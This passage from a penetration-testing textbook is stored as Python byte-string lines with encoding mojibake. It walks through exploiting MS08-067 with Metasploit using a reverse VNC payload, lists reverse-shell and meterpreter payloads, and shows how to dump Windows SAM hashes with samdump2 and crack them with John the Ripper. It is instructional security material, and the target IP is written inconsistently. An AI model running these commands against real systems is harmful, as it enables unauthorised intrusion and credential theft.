\xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d command prompt. there \n', b'are several different metasploit banners that are rotated and displayed at ran-\n', b'dom so if your screen looks different from figure 4.2, that is normal. the \n', b'important thing is that you get the msf\xee\x80\xae console. the initial metasploit screen \n', b'is shown in figure 4.2.\n', b'Please notice, when metasploit first loads, it shows you the number of exploits, \n', b'payloads, encoders, and nops available. it also shows you how many days have \n', b'passed since your last update. Because of metasploit\xe2\x80\x99s rapid growth and official \n', b'funding, it is vital that you keep metasploit up-to-date. this is easily accom-\n', b'plished by entering the following command after the \xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d prompt: msfup-\n', b'date. get into the habit of running this command often.\n', b'now that metasploit is updated, let us begin exploring the awesomeness of this \n', b'tool. in order to use metasploit a target must be identified, and exploit must be \n', b'fIGURE 4.2\n', b'Initial Metasploit Screen.\n', b'\x0cExploitation ChApTER 4\n', b'73\n', b'selected, a payload needs to be picked, and the exploit itself must be launched. \n', b'we will review the details of each of these in just a few moments but before \n', b'that, let us review the basics of metasploit terminology. As mentioned earlier, \n', b'an exploit is a prepackaged collection of code that gets sent to a remote system. \n', b'this code causes some atypical behavior on the target system that allows us to \n', b'execute a payload. recall that a payload is also a small snippet of code that is \n', b'used to perform some task like installing new software, creating new users, or \n', b'opening backdoors to the system.\n', b'exploits are the weaknesses that allow the attacker to execute remote code \n', b'(payloads) on the target system. Payloads are the additional software or func-\n', b'tionality that we install on the target system once the exploit has been success-\n', b'fully executed.\n', b'now that we have an understanding of how to access and start the msfconsole \n', b'and a solid understanding of the terminology used, let us examine how we \n', b'can use metasploit. when first hearing about and using metasploit, a common \n', b'mistake of would-be hackers and penetration testers is the lack of organization \n', b'and thoughtfulness. remember, metasploit is like a scalpel, not a hatchet. or \n', b'maybe more appropriately, metasploit is like a Barrett m107 sniper rifle, not a \n', b'm60 machine gun. most newcomers are overwhelmed by the sheer number of \n', b'exploits and payloads; and usually get lost trying to find appropriate exploits. \n', b'they spend their time blindly throwing every exploit against a target and hop-\n', b'ing that something sticks. later in this chapter, we will examine a tool that \n', b'works in this manner but for now we need to be a little more refined.\n', b'rather than blindly spraying exploits at a target, we need to find a way to match \n', b'up known system vulnerabilities with the prepackaged exploits in metasploit. \n', b'once you have learned this simple process, owning a vulnerable target becomes \n', b'a cinch. in order to correlate a target\xe2\x80\x99s vulnerabilities with metasploit\xe2\x80\x99s exploits, \n', b'we need to review our findings from step 2. we will start this process by focus-\n', b'ing on the nessus output. recall that nessus is a vulnerability scanner and \n', b'provides us with a list of known weaknesses or missing patches. when review-\n', b'ing the nessus output, you should make notes of any findings but pay special \n', b'attention to the vulnerabilities labeled as \xe2\x80\x9cHigh.\xe2\x80\x9d many \xe2\x80\x9cHigh\xe2\x80\x9d nessus vulner-\n', b'abilities, especially missing microsoft patches, correlate directly with metasploit \n', b'exploits.\n', b'Assume that during your penetration test you uncovered a new target at iP \n', b'address 172.16.45.130. running nmap tells you that your new target is a \n', b'windows xP machine with service Pack 3 installed. continuing on with step 2,  \n', b'we run nessus against the target. figure 4.3 shows the nessus report for \n', b'172.16.45.130. notice there are two \xe2\x80\x9cHigh\xe2\x80\x9d findings.\n', b'it is possible to drill down into each of the \xe2\x80\x9cHigh\xe2\x80\x9d findings to get the specific \n', b'information from nessus. double clicking on the first \xe2\x80\x9cHigh\xe2\x80\x9d finding reveals \n', b'the source of this issue is a missing patch. specifically, microsoft patch ms08-\n', b'067 has not been installed on the target machine. clicking on the second \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'74\n', b'\xe2\x80\x9cHigh\xe2\x80\x9d vulnerability discovered by nessus reveals another missing microsoft \n', b'patch. this vulnerability is the result of missing microsoft patch ms09-001. \n', b'figure 4.4 highlights the nessus report showing missing patch ms08-067.\n', b'At this point, we know our target has two missing patches. Both of these \n', b'patches are labeled as \xe2\x80\x9cHigh\xe2\x80\x9d and the descriptions that nessus provides for \n', b'both missing patches mention \xe2\x80\x9cremote code execution.\xe2\x80\x9d As an attacker your \n', b'heartbeat should be racing a little at this point, because the chances are very \n', b'good that metasploit will be able to exploit the target for us.\n', b'next we need to head over to metasploit and look for any exploits pertaining \n', b'to ms08-067 or ms09-001. once we have started metasploit (and updated), \n', b'we can use the \xe2\x80\x9csearch\xe2\x80\x9d command to locate any exploits related to our nessus \n', b'findings. to accomplish this, we issue the \xe2\x80\x9csearch\xe2\x80\x9d command followed by the \n', b'missing patch number. for example, at the \xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d prompt you would type:\n', b'msf \xee\x80\xae search ms08-067\n', b'once the command is completed, make detailed notes on the findings and \n', b'search for any other missing patches. metasploit will search through its infor-\n', b'mation and return any relevant information it finds. figure 4.5 shows the out-\n', b'put of searching for ms08-067 and ms09-001 within metasploit.\n', b'fIGURE 4.4\n', b'Screenshot Showing Missing Patch MS08-067 on the Target.\n', b'fIGURE 4.3\n', b'Nessus Output Showing Two \xe2\x80\x9cHigh\xe2\x80\x9d Findings.\n', b'Openmirrors.com\n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'75\n', b'let us review the output from figure 4.5:\n', b'n we started by issuing the \xe2\x80\x9csearch\xe2\x80\x9d command followed by the specific miss-\n', b'ing patch that nessus discovered.\n', b'n After searching, metasploit found a matching exploit and provided us with \n', b'several pieces of information about the exploit.\n', b'l first it provided us with a name and location; \xe2\x80\x9cwindows/smb/\n', b'ms08_067_netapi.\xe2\x80\x9d\n', b'l next metasploit provided us with a \xe2\x80\x9crank.\xe2\x80\x9d\n', b'it is important to pay close attention to the exploit rank. this information pro-\n', b'vides details about how dependable the exploit is (how often the exploit is suc-\n', b'cessful) as well as how likely the exploit is to cause instability or crashes on the \n', b'target system. numerically, the higher an exploit is ranked, the more likely it \n', b'is to succeed and the less likely it is to cause disruptions on the target system. \n', b'metasploit uses seven ratings to rank each exploit:\n', b'1. manual\n', b'2. low\n', b'3. Average\n', b'4. normal\n', b'5. good\n', b'fIGURE 4.5\n', b'Finding a Match between Nessus and Metasploit with the Search Function.\n', b'ALERT!\n', b'The Metasploit \xe2\x80\x9csearch\xe2\x80\x9d feature can also be used to locate non-Microsoft exploits.  \n', b'Nessus reports will often include a CVE or BID number to reference critical \n', b'vulnerabilities.  If you are unable to locate a missing MS patch or are conducting \n', b'a penetration test against a non-Microsoft product, be sure to search for matching \n', b'exploits by CVE or BID numbers!  Look for these in your Nessus scan report.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'76\n', b'6. great\n', b'7. excellent\n', b'You can find more information and a formal definition of the ranking meth-\n', b'odology on the metasploit.com website. finally, the metasploit search feature \n', b'presents us with a brief description of the exploit providing us with additional \n', b'details about the attack. when all other things are held equal, you should \n', b'choose exploits with a higher rank, as they are less likely to disrupt the normal \n', b'functioning of your target.\n', b'now that you understand how to match up vulnerabilities in nessus with \n', b'exploits in metasploit and you have the ability to choose between two or more \n', b'metasploit exploits, we are ready to unleash the full power of metasploit on \n', b'our target.\n', b'continuing with our example, we will use the ms08-067 because it has a \n', b'higher ranking. in order to run metasploit, we need to provide the framework \n', b'with a series of commands. Because metasploit is already running and we have \n', b'already found our exploit we continue by issuing the \xe2\x80\x9cuse\xe2\x80\x9d command in the \n', b'\xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d terminal to set the desired exploit.\n', b'msf \xee\x80\xae use windows/smb/ms08_067_netapi\n', b'this command tells metasploit to use the exploit that nessus identified. once \n', b'we have the exploit loaded, we need to view the available payloads. this is \n', b'accomplished by entering \xe2\x80\x9cshow payloads\xe2\x80\x9d in the \xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d terminal.\n', b'msf \xee\x80\xae show payloads\n', b'this will list all the available and compatible payloads for the exploit you have \n', b'chosen. to select one of the payloads, we type \xe2\x80\x9cset payload\xe2\x80\x9d and the payload \n', b'name into the \xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d terminal.\n', b'msf \xee\x80\xae set payload windows/vncinject/reverse_tcp\n', b'there are many, many payloads to choose from. A full examination of the dif-\n', b'ferent payloads is outside the scope of this book. Please review the metasploit \n', b'documentation for details on each of the available payloads. for this example, \n', b'we will install Vnc on the target machine and then have that machine connect \n', b'back to us. if you are unfamiliar with Vnc, it is remote control Pc software \n', b'that allows a user to connect to a remote machine, view the remote machine, \n', b'and control the mouse and keyboard as if you were physically sitting at that \n', b'machine. it works much the same as remote desktop or a terminal server.\n', b'it is important to note that the Vnc software is not currently installed on the tar-\n', b'get machine. remember that some exploits give us the ability to install software \n', b'on our target machine. in this example, we are sending an exploit to our target \n', b'machine. if successfully executed, the exploit will call the \xe2\x80\x9cinstall vnc\xe2\x80\x9d payload and \n', b'remotely install the software on the victim machine without any user interaction.\n', b'different payloads will require different additional options to be set. if you fail \n', b'to set the required options for a given payload, your exploit will fail. there are \n', b'\x0cExploitation ChApTER 4\n', b'77\n', b'few things worse than getting this far and failing to set an option. Be sure to \n', b'watch this step closely. to view the available options, issue the \xe2\x80\x9cshow options\xe2\x80\x9d \n', b'in the \xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d terminal:\n', b'msf \xee\x80\xae show options\n', b'After issuing the show options command, we are presented with a series of \n', b'choices that are specific to the payload we have chosen. when using the \xe2\x80\x9cwin-\n', b'dows/vncinject/reverse_tcp\xe2\x80\x9d payload, we see that there are two options that \n', b'need to be set because they are missing any default information. the first is \n', b'\xe2\x80\x9crHost\xe2\x80\x9d and the second is \xe2\x80\x9clHost.\xe2\x80\x9d rHost is the iP address of the remote \n', b'host and lHost is the iP address you are attacking from. to set these options, \n', b'we issue the \xe2\x80\x9cset option_name\xe2\x80\x9d command in the msf\xee\x80\xae terminal:\n', b'msf \xee\x80\xae set RHOST 172.168.45.130\n', b'msf \xee\x80\xae set LHOST 172.168.45.135\n', b'now that you have required options set, it is usually a good idea at this point \n', b'to reissue the \xe2\x80\x9cshow options\xe2\x80\x9d command to ensure you are not missing any \n', b'information.\n', b'msf \xee\x80\xae show options\n', b'once you are sure you have entered all the information correctly, you are ready \n', b'to launch your exploit. to send your exploit to the target machine, simply type \n', b'\xe2\x80\x9cexploit\xe2\x80\x9d into the \xe2\x80\x9cmsf\xee\x80\xae\xe2\x80\x9d terminal\n', b'msf \xee\x80\xae exploit\n', b'now sit back and watch as the magic happens. to truly appreciate the beauty \n', b'and complexity of what is going on here, you need to build your understanding \n', b'of buffer overflows and exploitation. this is something that is highly encouraged \n', b'when you finish the basics covered in this book. metasploit gives you the ability \n', b'to stand on the shoulders of giants and the power to launch incredibly complex \n', b'attacks with just a few commands. You should revel in the moment and enjoy \n', b'the victory of conquering your target, but you should also commit yourself to \n', b'learning even more. commit yourself to really understanding exploitation.\n', b'After typing \xe2\x80\x9cexploit\xe2\x80\x9d metasploit will go off and do its thing, sending exploits \n', b'and payloads to the target. this is where the \xe2\x80\x9chacking like Hugh Jackman\xe2\x80\x9d part \n', b'comes in. if you set up everything correctly, after a few seconds you will be pre-\n', b'sented with a screen belonging to your victim machine. Because our payload in \n', b'this example was a Vnc install, you will have the ability to view and interact with \n', b'the target machine as if you were physically sitting in front of it. it is hard not to \n', b'be impressed and even a little bewildered the first time you see (or complete) this \n', b'exploit in real time. figure 4.6 shows an example of the completed metasploit \n', b'attack. notice, the computer that launched the attack is the linux Backtrack, but \n', b'the attacker machine has full gUi access to the windows desktop of the victim.\n', b'Below you will find a cheat sheet of the steps required to run metasploit \n', b'against a target machine.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'78\n', b'1. start metasploit:\n', b'a. open a terminal and issue the following command /pentest/exploits/\n', b'framework3/msfconsole\n', b'2. issue the \xe2\x80\x9csearch\xe2\x80\x9d command to search for exploits:\n', b'a. msf \xee\x80\xae search missing_patch_number\n', b'3. issue the \xe2\x80\x9cuse\xe2\x80\x9d command to select the desired exploit:\n', b'a. msf \xee\x80\xae use exploit_name_and_path_as_shown_in_2a\n', b'4. issue \xe2\x80\x9cshow payloads\xe2\x80\x9d command to show available payloads:\n', b'a. msf \xee\x80\xae show payloads\n', b'5. issue \xe2\x80\x9cset\xe2\x80\x9d command to select payload\n', b'a. msf \xee\x80\xae set payload path_to_payload_as_shown_in_4a\n', b'6. issue \xe2\x80\x9cshow options\xe2\x80\x9d to view any options needing to be filled out before \n', b'exploiting the target\n', b'a. msf \xee\x80\xae show options\n', b'7. issue the \xe2\x80\x9cset\xe2\x80\x9d command for any options listed in 6a\n', b'a. msf \xee\x80\xae set option_name desired_option_input\n', b'8. issue \xe2\x80\x9cexploit\xe2\x80\x9d command to launch exploit against target\n', b'a. msf \xee\x80\xae \xe2\x80\x9cexploit\xe2\x80\x9d\n', b'now that you have a basic understanding of how to use metasploit, it is impor-\n', b'tant to review a few more of the basic payloads available to you. even though \n', b'the Vnc inject is incredibly cool and great for impressing friends, relatives, and \n', b'coworkers, it is rarely used in an actual Pt. in most penetration tests, hackers \n', b'prefer a simple shell allowing remote access and control of the target machine. \n', b'table 4.1 is a list of some basic payloads. Please refer to the metasploit docu-\n', b'mentation for a complete list. remember, one of the powers of metasploit is \n', b'the ability to mix and match exploits and payloads. this provides a penetra-\n', b'tion tester with an incredible amount of flexibility, allowing the functionality \n', b'fIGURE 4.6\n', b'Screenshot Showing Successful Exploit of Windows Target.\n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'79\n', b'of metasploit to change depending on the desired outcome. it is important that \n', b'you become familiar with the various payloads available to you.\n', b'many of these same payloads exist for linux, Bsd, osx, and other operating \n', b'systems. Again, you can find the full details by reviewing the metasploit docu-\n', b'mentation closely. one source of confusion for many people is the difference \n', b'between similar payloads like \xe2\x80\x9cwindows/meterpreter/bind_tcp\xe2\x80\x9d and \xe2\x80\x9cwin-\n', b'dows/meterpreter/reverse_tcp.\xe2\x80\x9d the keyword that causes the confusion here is \n', b'\xe2\x80\x9creverse.\xe2\x80\x9d there is a simple but important difference between the two payloads \n', b'and knowing when to use each will often mean the difference between an \n', b'exploit\xe2\x80\x99s success or failure. the key difference in these attacks is the direction of \n', b'the connection after the exploit has been delivered.\n', b'in a \xe2\x80\x9cbind\xe2\x80\x9d payload, we are both sending the exploit and making a connection \n', b'to the target from the attacking machine. in this instance, the attacker sends \n', b'the exploit to the target and the target waits passively for a connection to come \n', b'in. After sending the exploit, the attacker\xe2\x80\x99s machine then connects to the target.\n', b'in a \xe2\x80\x9creverse\xe2\x80\x9d payload, the attacking machine sends the exploit but forces the \n', b'target machine to connect back to the attacker. in this type of attack, rather than \n', b'passively waiting for an incoming connection on a specified port or service, \n', b'the target machine actively makes a connection back to the attacker. figure 4.7 \n', b'should make this concept clearer.\n', b'the last metasploit topic to discuss is the meterpreter. the meterpreter is \n', b'a powerful and flexible tool that you will need to learn to control if you are \n', b'going to master the art of metasploit. the meta-interpreter, or meterpreter, is a \n', b'Table 4.1      Sample of Payloads Available for Targeting Windows Machines\n', b'Metasploit Payload Name\n', b'Payload Description\n', b'windows/adduser\n', b'Create a new user in the local administrator  \n', b' group on the target machine\n', b'windows/exec\n', b'Execute a Windows binary (.exe) on the target  \n', b' machine\n', b'windows/shell_bind_tcp\n', b'Open a command shell on the target machine  \n', b' and wait for a connection\n', b'windows/shell_reverse_tcp\n', b'Target machine connects back to the attacker  \n', b' and opens a command shell (on the target)\n', b'windows/meterpreter/bind_tcp\n', b'Target machine installs the Meterpreter and  \n', b' waits for a connection\n', b'windows/meterpreter/reverse_tcp\n', b'Installs Meterpreter on the target machine then  \n', b' creates a connection back to the attacker\n', b'windows/vncinject/bind_tcp\n', b'Installs VNC on the target machine and waits  \n', b' for a connection\n', b'windows/vncinject/reverse_tcp\n', b'Installs VNC on the target machine and sends  \n', b' VNC connection back to target\n', b'Table 4.1\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'80\n', b'payload available in metasploit that gives attackers a powerful command shell \n', b'that can be used to interact with their target.\n', b'Another big advantage of the meterpreter is the fact that it runs entirely  \n', b'in memory and never utilizes the hard drive. this tactic provides a layer of \n', b'stealth that helps it evade many anti-virus systems and confounds some foren-\n', b'sic tools.\n', b'the meterpreter functions in a manner similar to windows cmd.exe or the linux \n', b'/bin/sh command. once installed on the victim machine, it allows the attacker \n', b'to interact with and execute commands on the target as if the attacker were sit-\n', b'ting at the local machine. it is very important to understand that the meterpreter \n', b'will run with the privileges associated with the program that was exploited. for \n', b'example, assume that our favorite network Admin Ben owned, has disregarded \n', b'all common sense and is running his irc program as \xe2\x80\x9croot\xe2\x80\x9d (the linux equiva-\n', b'lent of the windows \xe2\x80\x9cAdministrator\xe2\x80\x9d account). Unfortunately for Ben, his sys-\n', b'tem is out-of-date, and during a recent penetration test the attacker was able to \n', b'exploit Ben\xe2\x80\x99s irc client installing metasploit\xe2\x80\x99s meterpreter. Because Ben was run-\n', b'ning the irc program as the root account, and because the irc program was \n', b'exploited by metasploit, the meterpreter is now able to function with all the \n', b'privileges and rights of the \xe2\x80\x9croot\xe2\x80\x9d account! this is one example in a long list of \n', b'reasons why it is important to run all of your programs with the most restrictive \n', b'privileges possible, and avoid running anything as root or administrator.\n', b'Another reason for using the meterpreter over a traditional cmd or linux shell \n', b'stems from the fact that starting either of these on a target machine often starts \n', b'a new process that can be detected by a keen user or wily administrator. this \n', b'means that the attacker raises his or her visibility and chances of detection \n', b'while interacting with the target machine. furthermore, both the cmd.exe and /\n', b'bin/sh provide a limited number of tools and commands that can be accessed. \n', b'in contrast, the meterpreter was built from the ground up to be used as sort of \n', b'fIGURE 4.7\n', b'Difference between Bind and Reverse Payloads.\n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'81\n', b'\xe2\x80\x9chacker\xe2\x80\x99s cmd\xe2\x80\x9d with the ability to access and control the most popular tools \n', b'and functions needed during a penetration test.\n', b'the meterpreter has many great features that are built in by default. Basic func-\n', b'tions include the \xe2\x80\x9cmigrate\xe2\x80\x9d command, which is useful for moving the server to \n', b'another process. migrating the meterpreter server to another process is important \n', b'in case the vulnerable service you attacked is shut down or stopped. Another use-\n', b'ful function is the \xe2\x80\x9ccat\xe2\x80\x9d command that can be used to display local file contents \n', b'on the screen. this is useful for reviewing various files on the target. the \xe2\x80\x9cdown-\n', b'load\xe2\x80\x9d command allows you to pull a file or directory from the target machine, \n', b'making a local copy on the attacker\xe2\x80\x99s machine. the \xe2\x80\x9cupload\xe2\x80\x9d command can be \n', b'used to move files from the attacker\xe2\x80\x99s machine to the target machine. the \xe2\x80\x9cedit\xe2\x80\x9d \n', b'command can be used to make changes to simple files. the \xe2\x80\x9cexecute\xe2\x80\x9d com-\n', b'mand can be used to issue a command and have it run on the remote machine, \n', b'whereas \xe2\x80\x9ckill\xe2\x80\x9d can be used to stop a process. the following commands are \n', b'also useful and provide the exact same function as they do on a normal linux \n', b'machine: \xe2\x80\x9ccd,\xe2\x80\x9d \xe2\x80\x9cls,\xe2\x80\x9d \xe2\x80\x9cps,\xe2\x80\x9d \xe2\x80\x9cshutdown,\xe2\x80\x9d \xe2\x80\x9cmkdir,\xe2\x80\x9d \xe2\x80\x9cpwd,\xe2\x80\x9d and \xe2\x80\x9cifconfig.\xe2\x80\x9d\n', b'some of the more advanced features include the ability to extract password \n', b'hashes through the sAm Juicer tool, the ability to interact with a ruby shell, the \n', b'ability to load and execute arbitrary dlls on the target, and even the ability to \n', b'lock out the local keyboard and mouse!\n', b'As you can see, gaining access to a meterpreter shell is one of the most power-\n', b'ful, flexible, and stealthy ways that an attacker can interact with a target. it is \n', b'well worth your time to learn how to use this handy tool.\n', b'JOhN ThE RIppER: KING Of ThE pASSWORD \n', b'CRACKERS\n', b'it is hard to imagine discussing a topic like the basics of hacking without dis-\n', b'cussing passwords and password cracking. no matter what we do or how far \n', b'we advance, it appears that passwords remain the most popular way to protect \n', b'data and allow access to systems. with this in mind, let us take a brief detour \n', b'to cover the basics of password cracking.\n', b'there are several reasons why a penetration tester would be interested in crack-\n', b'ing passwords. first and foremost, this is a great technique for elevating and \n', b'escalating privileges. consider the following example: assume that you were \n', b'able to compromise a target system but after logging in you discover that you \n', b'have no rights on that system. no matter what you do, you are unable to read \n', b'and write to the target\xe2\x80\x99s files and folders and even worse, you are unable to \n', b'install any new software. this is often the case when you get access to a low \n', b'privileged account belonging to the \xe2\x80\x9cuser\xe2\x80\x9d or \xe2\x80\x9cguest\xe2\x80\x9d group.\n', b'if the account you accessed has no or few rights, you will be unable to per-\n', b'form many of the required steps to further compromise the system. i have actu-\n', b'ally been involved with several red team exercises where seemingly competent \n', b'hackers are at a complete loss when presented with an unprivileged account. \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'82\n', b'they throw up their hands and say \xe2\x80\x9cdoes anyone want unprivileged access to \n', b'this machine? i don\xe2\x80\x99t know what to do with it.\xe2\x80\x9d in this case, password crack-\n', b'ing is certainly a useful way to escalate privileges and often allows us to gain \n', b'administrative rights on a target machine.\n', b'Another reason for cracking passwords and escalating privileges is that many \n', b'of the tools we run as penetration testers require administrative-level access in \n', b'order to install and execute properly. it is not uncommon for penetration tes-\n', b'ters to find themselves in a situation where they were able to crack the local \n', b'administrator password (the local admin account on a machine) and have \n', b'this password turn out to be the exactly same password that the network \n', b'Administrator was using for the domain administrator account.\n', b'if we can access the password hashes on a target machine, the chances are good \n', b'that with enough time, John the ripper (Jtr), a password-cracking tool, can \n', b'discover the plaintext version of a password. Password hashes are \xe2\x80\xa6 and can \n', b'be accessed remotely or locally. regardless of how we access the hash file, the \n', b'steps and tools required to crack the passwords remain the same. in its most \n', b'basic form, password cracking consists of two parts:\n', b'1. locate and download the target system\xe2\x80\x99s password hash file.\n', b'2. Use a tool to convert the hashed (encrypted) passwords into a plaintext \n', b'password.\n', b'most systems do not store your password as the plaintext value you enter, but \n', b'rather they store an encrypted version of the password. this encrypted version \n', b'is called a hash. for example, assume you pick a password \xe2\x80\x9cqwerty\xe2\x80\x9c (which is \n', b'obviously a bad idea). when you log into your Pc, you type your password \n', b'\xe2\x80\x9cqwerty\xe2\x80\x9d to access the system. However, behind the scenes your computer is \n', b'actually calculating and checking an encrypted version of the password you \n', b'entered. this encrypted version or hash of your password appears to be a ran-\n', b'dom string of characters and numbers.\n', b'different systems use different hashing algorithms to create their password \n', b'hashes. most systems store their password hashes in a single location. this \n', b'hash file usually contains the encrypted passwords for several users and sys-\n', b'tem accounts. Unfortunately, gaining access to the password hashes is only \n', b'half the battle because simply viewing or even memorizing a password hash \n', b'(if such a thing were possible) is not enough to determine the plaintext. this \n', b'is because technically it is not supposed to be possible to work backward from \n', b'a hash to plaintext. By its definition, a hash, once encrypted, is never meant to \n', b'be unencrypted.\n', b'ALERT!\n', b'Password Hint #1: Never, never, never use the same password for your local machine \n', b'administrator as you do for your domain administrator account.\n', b'\x0cExploitation ChApTER 4\n', b'83\n', b'consider the following example. Assume that we have located a password \n', b'hash and we want to discover the plaintext value. it is important to understand \n', b'that in most cases we need the plaintext password, not the hashed password. \n', b'entering the hashed value into the system will not get us access because this \n', b'would simply cause the system to hash the hash (which is obviously incor-\n', b'rect). in order to discover the plaintext version of a password, we need to circle \n', b'through a series of steps.\n', b'first we select a hashing algorithm, next we pick a plaintext word, third we \n', b'encrypt the plaintext word with the hashing algorithm, and finally we compare \n', b'the output or hash of the chosen word with the hash from our target. if the \n', b'hashes match we know the plaintext password because no two different plain-\n', b'text words should produce the exact same hash.\n', b'Although this may seem like a clumsy, awkward, or slow process for a human, \n', b'computers specialize in tasks like this. given the computing power available \n', b'today, completing the four-step process outlined above is trivial for a modern \n', b'machine. the speed at which John the ripper can generate password hashes \n', b'will vary depending on the algorithm being used to create the hashes and the \n', b'hardware that is running John the ripper. it is safe to say that even an average \n', b'computer is capable of generating millions of windows (lm) password guesses \n', b'every second. John the ripper includes a nifty feature that allows you to bench-\n', b'mark your computer\xe2\x80\x99s performance. this benchmark will be measured in \n', b'cracks per second (c/s). You can run this by navigating to the following direc-\n', b'tory /pentest/passwords/jtr and running the following command:\n', b'./john --test\n', b'this will provide you with a list of performance metrics and let you know how \n', b'efficient your system is at generating guesses based on your hardware and the \n', b'algorithm being used to hash the passwords.\n', b'Before we can crack passwords, we first have to locate the password hash file. \n', b'As mentioned earlier, most systems store the encrypted password hashes in a \n', b'single location. in windows-based systems, the hashes are stored in a special \n', b'file called the sAm (security Account manager) file. on nt-based windows \n', b'systems including windows 2000 and above, the sAm file is located in the c:\\\n', b'windows\\system32\\config\\ directory. now that we know the location of the \n', b'sAm file, we need to extract the password hashes from the file. Because the \n', b'sAm file holds some very important information, microsoft has wisely added \n', b'some additional security features to help protect the file.\n', b'first the sAm file is actually locked when the operating system boots up. this \n', b'means that while the os is running we do not have the ability to open or copy \n', b'the sAm file. in addition to the lock, the entire sAm file is encrypted and not \n', b'viewable.\n', b'fortunately, there is a way to bypass both of these restrictions. on a remote \n', b'machine, we can use the meterpreter and sAm Juicer to access the hashes on a live \n', b'target. if we have physical access to the system, we can also boot to an alternate \n', b'Openmirrors.com\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'84\n', b'operating system like Backtrack. By booting our target to an alternate operating \n', b'system, we are able to bypass the windows sAm lock. this is possible because \n', b'the windows os never starts, the lock never engages, and we are free to access the \n', b'sAm file. Unfortunately, the sAm file is still encrypted, so we need to use a tool to \n', b'access the hashes. fortunately, the required tool is built into Backtrack.\n', b'After booting the target system to an alternate operating system, the first thing \n', b'you need to do is to mount the local hard drive. Be sure to mount the drive \n', b'containing the windows folder. we can accomplish this by opening a terminal \n', b'and typing:\n', b'mount /dev/sda1 /mnt/sda1\n', b'it is important that you mount the correct drive as not all systems will have \n', b'a /dev/sda1. if you are unsure about which drive to mount, you can run the \n', b'\xe2\x80\x9cfdisk -l\xe2\x80\x9d command. the fdisk tool will list each of the drives available on your \n', b'target system and should help you determine which drive you need to mount. \n', b'You may also need to create a mount point in the /mnt directory. to do so, you \n', b'can simply use the \xe2\x80\x9cmkdir\xe2\x80\x9d command:\n', b'mkdir /mnt/sda1\n', b'if you are unsure about how to use the mount command or locate the proper \n', b'drive, please review the linux man pages for the mount command or practice \n', b'your newly acquired google skills from step 1.\n', b'once you have successfully mounted the local drive in Backtrack, you will be \n', b'able to browse the windows \xe2\x80\x9cc:\\\xe2\x80\x9d drive. You should now be able to navigate to \n', b'the sAm file. You can do so by typing the following command into a terminal \n', b'window:\n', b'cd /mnt/sda1/Windows/system32/config\n', b'if everything has gone as planned, you should be in the directory containing \n', b'the sAm file. to view the contents of the current folder issue the \xe2\x80\x9cls\xe2\x80\x9d com-\n', b'mand in the terminal window, you should see the sAm file. figure 4.8 shows a \n', b'screenshot displaying each of the steps required to locate the sAm file (assum-\n', b'ing you have a /mnt/sda1 directory already created).\n', b'in step 1 we issue the \xe2\x80\x9cfdisk \xe2\x80\x93l\xe2\x80\x9d command to view the available drives on the \n', b'local disk. in step 2, fdisk responds back by stating that there is a drive at /\n', b'dev/sda1. in step 3 we use this information to mount the drive into our /mnt/\n', b'sda1 folder so that we can access the local hard drive. now that our drive is \n', b'mounted and available, in step 4 we move into the directory containing the \n', b'sAm file by using the \xe2\x80\x9ccd\xe2\x80\x9d (change directory) command. in step 5 we verify \n', b'that we are in the proper directory by issuing the \xe2\x80\x9cls\xe2\x80\x9d command to list the con-\n', b'tents of the current folder. finally, step 6 shows the sAm file.\n', b'now that we have located the sAm file, we can use a tool called samdump2 to \n', b'extract the hashes. At this point we have the ability to view and copy the sAm \n', b'file, in effect overcoming the first security feature, but at this point the sAm \n', b'\x0cExploitation ChApTER 4\n', b'85\n', b'file is still encrypted. in order to view an unencrypted copy of the sAm file, we \n', b'need to run samdump2. samdump2 utilizes a file on the local machine called \n', b'\xe2\x80\x9csystem\xe2\x80\x9d to decrypt the sAm file. fortunately, the \xe2\x80\x9csystem\xe2\x80\x9d file is located in the \n', b'same directory as the sAm file.\n', b'to run samdump2, we issue the \xe2\x80\x9csamdump2\xe2\x80\x9d command followed by the name \n', b'and location of the \xe2\x80\x9csystem\xe2\x80\x9d file, followed by the name and location of the \n', b'sAm file we want to view. recall that earlier we had issued the \xe2\x80\x9ccd\xe2\x80\x9d command \n', b'to navigate to the windows/system32/config folder. At this point we can extract \n', b'the contents of the sAm file by running the following command in a terminal:\n', b'samdump2 system SAM \xee\x80\xae /tmp/hashes.txt\n', b'this will invoke the samdump2 program and appending the \xe2\x80\x9c \xee\x80\xae  hashes.txt\xe2\x80\x9d \n', b'command will save the results to a file called \xe2\x80\x9chashes.txt\xe2\x80\x9d in Backtrack\xe2\x80\x99s /tmp \n', b'directory. figure 4.9 shows a screenshot of the samdump2 command and dis-\n', b'plays the contents of the hashes.txt file.\n', b'now that we have the password hashes saved, we need to transfer them off the \n', b'live Backtrack disk. this can be done by simply e-mailing the hashes.txt file \n', b'to yourself or inserting a thumb drive and creating a local copy of the hashes. \n', b'either way, make sure you save the hashes.txt file because you are working off \n', b'a \xe2\x80\x9clive\xe2\x80\x9d cd and your changes are not persistent. this means when you reboot \n', b'the target machine all the files you created in the Backtrack disk will be gone \n', b'for good!\n', b'now that you have a copy of the password hashes, you can begin the process of \n', b'cracking the passwords. to accomplish this task, we will use a tool called John \n', b'the ripper. like each of the other tools we have examined, John the ripper is \n', b'available for free. You can download it by going to http://www.openwall.com/\n', b'fIGURE 4.8\n', b'Locating the SAM File for Password Cracking.\n', b'Openmirrors.com\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'86\n', b'john. Before we begin utilizing John the ripper, it is important that you under-\n', b'stand how microsoft creates password hashes.\n', b'originally microsoft utilized a hashing algorithm called lan manager (or lm \n', b'for short). lm hashes suffered from several key weaknesses that made password \n', b'cracking a trivial task. first, when lm hashes are created the 